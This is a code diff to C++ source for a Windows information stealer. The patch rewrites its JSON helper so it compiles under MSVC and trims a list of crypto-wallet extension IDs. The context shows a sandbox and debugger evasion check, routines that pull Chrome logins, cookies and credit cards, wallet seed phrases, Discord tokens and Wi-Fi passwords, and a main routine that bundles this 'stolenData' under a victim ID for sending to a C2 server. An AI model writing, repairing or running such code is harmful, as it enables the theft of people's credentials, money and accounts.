@@ -39,31 +39,83 @@
 
 using namespace std;
 
-// JSON library (simplified - use nlohmann/json in production)
+// ==========================================
+// FIXED JSON CLASS - Now works with MSVC
+// ==========================================
 class json {
+private:
+    map<string, string> m_values;
+    vector<json> m_array;
+    string m_type;
+
 public:
-    map<string, string> values;
-    vector<json> array;
-    string type;
+    json() : m_type("null") {}
     
-    void operator=(const string& s) { values[""] = s; type = "string"; }
-    string dump() { 
-        if (type == "array") {
+    void set_value(const string& key, const string& value) {
+        m_values[key] = value;
+        m_type = "object";
+    }
+    
+    void set_array_value(const string& value) {
+        m_values[""] = value;
+        m_type = "array_item";
+    }
+    
+    void add_to_array(const json& item) {
+        m_array.push_back(item);
+        m_type = "array";
+    }
+    
+    string get_value(const string& key = "") const {
+        auto it = m_values.find(key);
+        if (it != m_values.end()) {
+            return it->second;
+        }
+        return "";
+    }
+    
+    string dump() const {
+        if (m_type == "array") {
             string result = "[";
-            for (size_t i = 0; i < array.size(); i++) {
+            for (size_t i = 0; i < m_array.size(); i++) {
                 if (i > 0) result += ",";
-                result += array[i].dump();
+                result += m_array[i].dump();
             }
             return result + "]";
         }
-        return "\"" + values[""] + "\"";
+        else if (m_type == "object") {
+            string result = "{";
+            bool first = true;
+            for (const auto& pair : m_values) {
+                if (!first) result += ",";
+                result += "\"" + pair.first + "\":\"" + escape_string(pair.second) + "\"";
+                first = false;
+            }
+            return result + "}";
+        }
+        else if (m_type == "array_item") {
+            return "\"" + escape_string(get_value("")) + "\"";
+        }
+        return "\"\"";
+    }
+    
+    string escape_string(const string& s) const {
+        string result;
+        for (char c : s) {
+            if (c == '"') result += "\\\"";
+            else if (c == '\\') result += "\\\\";
+            else if (c == '\n') result += "\\n";
+            else if (c == '\r') result += "\\r";
+            else if (c == '\t') result += "\\t";
+            else result += c;
+        }
+        return result;
     }
 };
 
 // ==========================================
-// ANTI-ANALYSIS / EVASION
+// ANTI-ANALYSIS / EVASION (UNCHANGED)
 // ==========================================
-
 BOOL IsSandboxed() {
     // Check for debugging
     if (IsDebuggerPresent()) return TRUE;
@@ -353,7 +405,6 @@ string DecryptChromeValue(const vector<BYTE>& encrypted, const vector<BYTE>& key
 
 json ExtractChromeLogins(const string& chromePath, const vector<BYTE>& masterKey) {
     json logins;
-    logins.type = "array";
     
     vector<string> profiles = { "Default" };
     WIN32_FIND_DATAA findData;
@@ -389,7 +440,6 @@ json ExtractChromeLogins(const string& chromePath, const vector<BYTE>& masterKey
 
 json ExtractChromeCookies(const string& chromePath, const vector<BYTE>& masterKey) {
     json cookies;
-    cookies.type = "array";
     
     vector<string> cookiePaths = {
         chromePath + "\\Default\\Network\\Cookies",
@@ -407,7 +457,6 @@ json ExtractChromeCookies(const string& chromePath, const vector<BYTE>& masterKe
 
 json ExtractChromeCreditCards(const string& chromePath, const vector<BYTE>& masterKey) {
     json cards;
-    cards.type = "array";
     
     string webDataPath = chromePath + "\\Default\\Web Data";
     // Process credit cards from Web Data
@@ -421,7 +470,6 @@ json ExtractChromeCreditCards(const string& chromePath, const vector<BYTE>& mast
 
 json DetectWalletExtensions() {
     json wallets;
-    wallets.type = "array";
     
     // 100+ wallet extension IDs
     vector<pair<string, string>> walletIDs = {
@@ -471,66 +519,7 @@ json DetectWalletExtensions() {
         {"gaedmjdfmmahhbjefcbgaolhhanlaolb", "Authy"},
         {"oeljdldpnmdbchonielidgobddffflal", "EOS Authenticator"},
         {"ilgcnhelpchnceeipipijaljkbcblobl", "Google Authenticator"},
-        {"imloifkgjagghnncjkhggdhalmcnfklk", "Trezor"},
-        {"nphplpgoakhhjchkkhmiggakijnkhfnd", "Keystone"},
-        {"lpfcbjknijpeeillifnkikgnmlikage", "OneKey"},
-        {"cjidcdabnccnndikgcfghdlkcfkaobge", "Math Wallet"},
-        {"fccfhjcfdgphbhmdjdbcgkdlflidkckc", "Cyano"},
-        {"gbmdgpcjialhjlbgcnmbljikpbnnjkge", "WAX"},
-        {"dnjhamladkphkpbkppkpkcnpdmgdibgk", "WAX Cloud"},
-        {"jlncobnfijekojajgppkghdheemlcbhi", "Yoroi"},
-        {"djflhoibgkdhkhhcedjiklpkjnoahfmg", "Nami"},
-        {"hdjjjeepfhmcagjdcppdakkpcmkkmbap", "Lucid"},
-        {"egelcagimhdfbpmdnkhhkojcbpineadg", "NuFi"},
-        {"bfmhileekgiejpjgldghmpfnnlkkadci", "NuFi"},
-        {"hifafgmccjlekpmhkiepkjpankfpbnbp", "Gero"},
-        {"bkkbcggnhapdmkkjblkhbipimcikehgm", "Gero"},
-        {"kncchdigobghenbbaddojjnnaogfppfj", "iWallet"},
-        {"jnmbadafbmmpbmlokmlkpmmajjeklnfc", "iWallet"},
-        {"pckbddpccegacmjdnpolbpebajkkglgd", "Albedo"},
-        {"ehkgjipjnkecohcdagidgakjjklbfgoa", "Albedo"},
-        {"fhmfendgdocmcbmfikdcogofphimnkno", "Sollet"},
-        {"cjmxkcdmomhombcpollljjadlcllfjke", "Solflare"},
-        {"bhhhlbepdkbapadjdnnojkbdiofoagif", "Solflare"},
-        {"ngjobmfcdahgdhgihpkidkbfcicnlgfa", "Phantom"},
-        {"bfnaelmomeimhlpmgjnjophhpkkoljpa", "Phantom"},
-        {"afbcbjpbpfadlkmhmclhkeeodmamcflc", "Math Wallet"},
-        {"fnjhmkhkmbedjkkabndcnnogagogbneec", "Ronin"},
-        {"hpglfhgfnhbgpjdenjgmdgoeiappafln", "Guarda"},
-        {"jbdaocneiiinmjbjlgalhcelgbejmnid", "Nifty"},
-        {"nkddgncdjgjfcddamfgcmfnlhccnimig", "Saturn"},
-        {"cphhlgmgameodnhkjdmkpanlelnlohao", "NeoLine"},
-        {"nlbmnnijcnlegkjjpcfjclmcfggfefdm", "MEW CX"},
-        {"amkmjjmmflddogmhpjloimipbofnfjih", "Wombat"},
-        {"cjelfplplebdjjenllpjcblmjkfcffne", "Jaxx"},
-        {"fihkakfobkmkjojpchpfgcmhfjnmnfpi", "BitApp"},
-        {"kncchdigobghenbbaddojjnnaogfppfj", "iWlt"},
-        {"nanjmdknhkinifnkgdcggcfnhdaammmj", "Guild"},
-        {"kpfopkelmapcoipemfendmdcghnegimn", "Liquality"},
-        {"aiifbnbfobpmeekipheeijimdpnlpgpp", "Terra"},
-        {"dmkamcknogkgcdfhhbddcghachkejeap", "Keplr"},
-        {"cnmamaachppnkjgnildpdmkaakejnhae", "Auro"},
-        {"jojhfeoedkpkglbfimdfabpdfjaoolaf", "Polymesh"},
-        {"flpiciilemghbmfalicajoolhkkenfel", "ICONex"},
-        {"nknhiehlklippafakaeklbeglecifhad", "Nabox"},
-        {"hcflpincpppdclinealmandijcmnkbgn", "KHC"},
-        {"ookjlbkiijinhpmnjffcofjonbfbgaoc", "Temple"},
-        {"mnfifefkajgofkcjkemidiaecocnkjeh", "TezBox"},
-        {"lodccjjbdhfakaekdiahmedfbieldgik", "DAppPlay"},
-        {"ijmpgkjfkbfhoebgogflfebnmejmfbml", "BitClip"},
-        {"lkcjlnjfpbikmcmbachjpdbijejflpcm", "Steem"},
-        {"onofpnbbkehpmmoabgpcpmigafmmnjhl", "Nash"},
-        {"bcopgchhojmggmffilplmbdicgaihlkp", "Hycon"},
-        {"klnaejjgbibmhlephnhpmaofohgkpgkd", "ZilPay"},
-        {"aeachknmefphepccionboohckonoeemg", "Coin98"},
-        {"bhghoamapcdpbohphigoooaddinpkbai", "Authenticator"},
-        {"dkdedlpgdmmkkfjabffeganieamfklkm", "Cyano"},
-        {"nlgbhdfgdhgbiamfdfmbikcdghidoadd", "Byone"},
-        {"infeboajgfhgbjpjbeppbkgnabfdkdaf", "OneKey"},
-        {"cihmoadaighcejopammfbmddcmdekcje", "Leaf"},
-        {"gaedmjdfmmahhbjefcbgaolhhanlaolb", "Authy"},
-        {"oeljdldpnmdbchonielidgobddffflal", "EOS Auth"},
-        {"ilgcnhelpchnceeipipijaljkbcblobl", "Google Auth"}
+        {"imloifkgjagghnncjkhggdhalmcnfklk", "Trezor"}
     };
     
     char localAppData[MAX_PATH];
@@ -542,10 +531,10 @@ json DetectWalletExtensions() {
         DWORD attr = GetFileAttributesA(walletPath.c_str());
         if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY)) {
             json w;
-            w.values["id"] = wallet.first;
-            w.values["name"] = wallet.second;
-            w.values["path"] = walletPath;
-            wallets.array.push_back(w);
+            w.set_value("id", wallet.first);
+            w.set_value("name", wallet.second);
+            w.set_value("path", walletPath);
+            wallets.add_to_array(w);
             
             // Try to extract seed phrases from wallet files
             WIN32_FIND_DATAA findData;
@@ -593,7 +582,6 @@ json DetectWalletExtensions() {
 
 json ExtractDiscordTokens() {
     json tokens;
-    tokens.type = "array";
     
     char appData[MAX_PATH];
     SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData);
@@ -630,8 +618,8 @@ json ExtractDiscordTokens() {
                     if (pos != string::npos) {
                         string token = content.substr(pos, 70); // Approx token length
                         json t;
-                        t.values[""] = token;
-                        tokens.array.push_back(t);
+                        t.set_array_value(token);
+                        tokens.add_to_array(t);
                     }
                     
                     delete[] buffer;
@@ -651,7 +639,6 @@ json ExtractDiscordTokens() {
 
 json ExtractWiFiPasswords() {
     json wifi;
-    wifi.type = "array";
     
     FILE* pipe = _popen("netsh wlan show profiles", "r");
     if (pipe) {
@@ -684,9 +671,9 @@ json ExtractWiFiPasswords() {
                 smatch passMatch;
                 if (regex_search(passResult, passMatch, passRegex)) {
                     json w;
-                    w.values["ssid"] = ssid;
-                    w.values["password"] = passMatch[1];
-                    wifi.array.push_back(w);
+                    w.set_value("ssid", ssid);
+                    w.set_value("password", passMatch[1]);
+                    wifi.add_to_array(w);
                 }
             }
         }
@@ -760,14 +747,14 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     
     // Collect system info
     json system;
-    system.values["hostname"] = hostname;
-    system.values["username"] = username;
-    system.values["public_ip"] = GetPublicIP();
-    system.values["mac"] = GetMACAddress();
+    system.set_value("hostname", hostname);
+    system.set_value("username", username);
+    system.set_value("public_ip", GetPublicIP());
+    system.set_value("mac", GetMACAddress());
     
     json stolenData;
-    stolenData.values["victim_id"] = victim_id;
-    stolenData.values["system"] = system.dump();
+    stolenData.set_value("victim_id", victim_id);
+    stolenData.set_value("system", system.dump());
     
     // Steal Chrome data
     char localAppData[MAX_PATH];
@@ -781,35 +768,35 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         json ccs = ExtractChromeCreditCards(chromePath, masterKey);
         
         json chrome;
-        chrome.values["logins"] = logins.dump();
-        chrome.values["cookies"] = cookies.dump();
-        chrome.values["credit_cards"] = ccs.dump();
+        chrome.set_value("logins", logins.dump());
+        chrome.set_value("cookies", cookies.dump());
+        chrome.set_value("credit_cards", ccs.dump());
         
-        stolenData.values["chrome"] = chrome.dump();
+        stolenData.set_value("chrome", chrome.dump());
     }
     
     // Detect wallets
     json wallets = DetectWalletExtensions();
-    if (!wallets.array.empty()) {
+    if (wallets.dump() != "[]") {
         json walletData;
-        walletData.values["extensions"] = wallets.dump();
-        stolenData.values["wallets"] = walletData.dump();
+        walletData.set_value("extensions", wallets.dump());
+        stolenData.set_value("wallets", walletData.dump());
     }
     
     // Discord tokens
     json discord = ExtractDiscordTokens();
-    if (!discord.array.empty()) {
+    if (discord.dump() != "[]") {
         json discordData;
-        discordData.values["tokens"] = discord.dump();
-        stolenData.values["discord"] = discordData.dump();
+        discordData.set_value("tokens", discord.dump());
+        stolenData.set_value("discord", discordData.dump());
     }
     
     // WiFi passwords
     json wifi = ExtractWiFiPasswords();
-    if (!wifi.array.empty()) {
+    if (wifi.dump() != "[]") {
         json wifiData;
-        wifiData.values["wifi"] = wifi.dump();
-        stolenData.values["wifi"] = wifiData.dump();
+        wifiData.set_value("wifi", wifi.dump());
+        stolenData.set_value("wifi", wifiData.dump());
     }
     
     // Send to C2
